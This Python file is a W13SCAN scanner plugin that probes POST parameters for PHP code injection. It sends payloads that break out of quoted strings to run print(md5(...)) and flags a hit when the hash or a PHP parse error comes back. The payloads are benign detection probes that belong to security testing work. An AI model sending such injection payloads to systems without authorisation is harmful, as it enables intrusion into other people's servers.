#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/7 2:20 PM
# @Author  : w8ay
# @File    : post_comand_php_code.py

import copy
import random
import re

import requests

from W13SCAN.lib.common import md5
from W13SCAN.lib.const import ignoreParams, POST_HINT, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'PHP代码注入 POST插件'
    desc = '''支持POST请求方式和回显型的PHP代码注入'''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        post_hint = self.requests.post_hint
        post_data = self.requests.post_data

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if method == 'POST':

            regx = 'Parse error: syntax error,.*?\Sin\S'
            randint = random.randint(1, 256)
            verify_result = md5(str(randint).encode())
            payloads = [
                "print(md5({}));",
                ";print(md5({}));",
                "';print(md5({}));$a='",
                "\";print(md5({}));$a=\"",
                "${{@print(md5({}))}}",
                "${{@print(md5({}))}}\\"
            ]

            if post_hint == POST_HINT.NORMAL:
                for k, v in post_data.items():
                    if k.lower() in ignoreParams:
                        continue
                    data = copy.deepcopy(post_data)
                    for payload in payloads:
                        if payload[0] == "p":
                            data[k] = payload.format(randint)
                        else:
                            data[k] = v + payload.format(randint)
                        r = requests.post(url, data=data, headers=headers)
                        html1 = r.text
                        if verify_result in html1:
                            out.success(url, self.name, payload="{}:{}".format(k, data[k]), method=method,
                                        data=str(data), raw=r.raw)
                            break
                        if re.search(regx, html1, re.I | re.S | re.M):
                            out.success(url, self.name, payload="{}:{}".format(k, data[k]), method=method,
                                        data=str(data), raw=r.raw)
                            break
